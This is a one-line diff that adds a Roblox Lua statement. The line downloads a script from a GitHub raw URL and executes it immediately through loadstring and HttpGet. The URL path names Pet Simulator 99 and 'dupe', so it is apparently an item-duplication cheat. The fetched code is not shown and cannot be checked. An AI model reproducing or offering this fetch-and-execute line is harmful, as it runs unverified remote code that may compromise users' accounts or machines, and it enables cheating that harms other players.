@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(“https://raw.githubusercontent.com/1official/Mainstring.lua/main/Ps99/dupe”))()
